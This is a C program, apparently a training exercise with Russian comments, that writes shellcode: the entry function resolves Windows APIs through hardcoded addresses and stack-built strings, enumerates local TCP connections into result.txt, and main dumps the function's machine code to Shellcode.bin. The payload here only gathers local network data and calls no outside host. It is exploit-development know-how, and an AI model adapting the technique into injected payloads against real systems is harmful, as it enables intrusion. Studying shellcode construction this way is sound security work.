
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <iphlpapi.h>
#include <Windows.h>
#include <intrin.h>

size_t _strlen(const char*);
void _memset(void* s, int c, size_t n);
char* _strcpy(char* dst, rsize_t size, const char* src);
char* _iltoa(int number, char* destination, int base);

void ShellcodeEntry()
{

	HMODULE(*_GetModuleHandleA)(LPCSTR) = 0x62501B48;
	FARPROC(*_GetProcAddress)(HMODULE, LPCSTR) = 0x62501B40;


	void* (*__cdecl _malloc)(size_t) = 0x62501AD8;
	void (*__cdecl _free)(void*) = 0x62501AE8;

	//  Си строки задаем в следующем виде, чтобы они размещались на стеке,
	char cstrKernel32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l','\0' };
	HMODULE hKernel32dll = _GetModuleHandleA(cstrKernel32dll);

	char cstrExitProcess[] = { 'E','x','i','t','P','r','o','c','e','s','s','\0' };
	void (*f_ExitProcess)(UINT) = _GetProcAddress(hKernel32dll, cstrExitProcess);

	char cstrCreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A','\0' };
	HANDLE(*f_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)
		= _GetProcAddress(hKernel32dll, cstrCreateFileA);
	if (f_CreateFileA == NULL)
	{
		f_ExitProcess(2);
	}

	char cstrWriteFile[] = { 'W','r','i','t','e','F','i','l','e','\0' };
	BOOL(*f_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED) = _GetProcAddress(hKernel32dll, cstrWriteFile);
	if (f_WriteFile == NULL)
	{
		f_ExitProcess(3);
	}

	char cstrLoadLobraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
	HMODULE(*f_LoadLibraryA)(LPCSTR) = _GetProcAddress(hKernel32dll, cstrLoadLobraryA);
	if (f_LoadLibraryA == NULL)
	{
		f_ExitProcess(4);
	}

	char cstrIphlpapidll[] = { 'I','p','h','l','p','a','p','i','.','d','l','l','\0' };
	HMODULE hIphlpapidll = f_LoadLibraryA(cstrIphlpapidll);
	if (hIphlpapidll == NULL)
	{
		f_ExitProcess(5);
	}

	char cstrFileName[] = { 'r','e','s','u','l','t','.','t','x','t','\0' };
	HANDLE hFile = f_CreateFileA(cstrFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		f_ExitProcess(7);
	}

	char cstrWs2_32dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
	HMODULE hWs2_32dll = f_LoadLibraryA(cstrWs2_32dll);

	char cstrWSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p','\0' };
	int (*f_WSAStartup)(WORD,LPWSADATA) = _GetProcAddress(hWs2_32dll, cstrWSAStartup);
	if (f_WSAStartup == NULL)
	{
		f_ExitProcess(8);
	}		
	char cstrGetTcpTable[] = { 'G','e','t','T','c','p','T','a','b','l','e','\0' };
	ULONG(*f_GetTcpTable)(PMIB_TCPTABLE, PULONG, BOOL) = _GetProcAddress(hIphlpapidll, cstrGetTcpTable);
	if (f_GetTcpTable == NULL)
	{
		f_ExitProcess(9);
	}	
	char cstrinet_ntoa[] = { 'i','n','e','t','_','n','t','o','a','\0' };
	char*(*f_inet_ntoa)(struct in_addr) = _GetProcAddress(hWs2_32dll, cstrinet_ntoa); 
	if (f_inet_ntoa == NULL)
	{
		f_ExitProcess(10);
	}	
	char cstrSocket[] = { 's','o','c','k','e','t','\0' };
	int (*f_Socket)(int,int,int) = _GetProcAddress(hWs2_32dll, cstrSocket);
	if (f_Socket == NULL)
	{
		f_ExitProcess(11);
	}
	char string1[] = { 'T','C','P',' ','L','o','c','a','l',' ','A','d','d','r',':',' ','\0' };
	char string2[] = { ' ','l','o','c','a','l',' ','P','o','r','t',':','\0' };

	//
	// shell
	// Declare and initialize variables
	PMIB_TCPTABLE pTcpTable;
	DWORD dwSize = 0;
	DWORD dwRetVal = 0;
	char* port = (char*)_malloc(6);
	char szLocalAddr[128];

	struct in_addr IpAddr;

	int i;

	pTcpTable = (MIB_TCPTABLE*)_malloc(sizeof(MIB_TCPTABLE));
	if (pTcpTable == NULL) {
		f_ExitProcess(12);
	}

	dwSize = sizeof(MIB_TCPTABLE);
	// Make an initial call to GetTcpTable to
	// get the necessary size into the dwSize variable
		if ((dwRetVal = f_GetTcpTable(pTcpTable, &dwSize, TRUE)) ==
		ERROR_INSUFFICIENT_BUFFER) {
		pTcpTable = (MIB_TCPTABLE*)_malloc(dwSize);
		if (pTcpTable == NULL) {
			f_ExitProcess(13);
		}
	}
	DWORD bytesWritten;
	char newLine = '\n';
	// Make a second call to GetTcpTable to get
	// the actual data we require
	if ((dwRetVal = f_GetTcpTable(pTcpTable, &dwSize, TRUE)) == NO_ERROR) {
		for (i = 0; i < (int)pTcpTable->dwNumEntries; i++) {
			IpAddr.S_un.S_addr = (u_long)pTcpTable->table[i].dwLocalAddr;
			_strcpy(szLocalAddr, sizeof(szLocalAddr), f_inet_ntoa(IpAddr));
					IpAddr.S_un.S_addr = (u_long)pTcpTable->table[i].dwRemoteAddr;

			f_WriteFile(hFile, string1, _strlen(string1), &bytesWritten, NULL);
			f_WriteFile(hFile, szLocalAddr, _strlen(szLocalAddr), &bytesWritten, NULL);
			f_WriteFile(hFile, string2, _strlen(string2), &bytesWritten, NULL);
			_memset(port, 0, 6);
			port = _iltoa((u_short)pTcpTable->table[i].dwLocalPort, port, 10);
			f_WriteFile(hFile, port, _strlen(port), &bytesWritten, NULL);
			f_WriteFile(hFile, &newLine, 1, &bytesWritten, NULL);/**/
		}
	}

	//shell
	f_ExitProcess(1000);
}

//
// Моя реализации strlen. Ну как моя, этот велик я украл.
size_t _strlen(const char* str)
{
	size_t length = 0;

	while (*str++)
		length++;

	return (length);
}

void _memset(void* s, int c, size_t n)
{
	char* p = s;
	while (n--) *p++ = c;
}

char* _strcpy(char* dst, rsize_t size, const char* src) {
	char* d = dst;
	int i = 0;
	while ((*d++ = *src++) && i < size)
		;
	return dst;
}

char* _iltoa(int number, char* destination, int base) {
	int count = 0;
	do {
		int digit = number % base;
		destination[count++] = (digit > 9) ? digit - 10 + 'A' : digit + '0';
	} while ((number /= base) != 0);
	destination[count] = '\0';
	int i;
	for (i = 0; i < count / 2; ++i) {
		char symbol = destination[i];
		destination[i] = destination[count - i - 1];
		destination[count - i - 1] = symbol;
	}
	return destination;
}

void END_SHELLCODE(void) {}

int main()
{
	FILE* fShellcode = fopen("Shellcode.bin", "wb");
	if (fShellcode == NULL)
	{
		exit(printf("Error: fopen returned NULL"));
	}

	//
	//  Записываем в файл машинный код функции ShellcodeEntry.
	fwrite(ShellcodeEntry, sizeof(char) ,(char*)END_SHELLCODE - (char*)ShellcodeEntry, fShellcode);

	fclose(fShellcode);

	printf("\nShellcode size = %u", (char*)END_SHELLCODE - (char*)ShellcodeEntry);

	return 0;
}